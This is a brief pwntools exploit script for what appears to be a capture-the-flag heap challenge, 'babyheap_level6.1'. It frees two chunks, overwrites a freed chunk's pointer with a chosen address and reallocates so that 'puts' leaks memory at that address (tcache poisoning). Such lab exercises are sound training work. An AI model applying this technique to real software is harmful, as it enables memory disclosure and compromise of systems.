from pwn import *

p = process("/challenge/babyheap_level6.1")

p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'424')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'424')
p.sendline(b'free')
p.sendline(b'0')
p.sendline(b'free')
p.sendline(b'1')
p.sendline(b'scanf')
p.sendline(b'1')
p.sendline(p64(0x427F3F))
p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'424')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'424')

p.sendline(b'puts')
p.sendline(b'1')

p.interactive()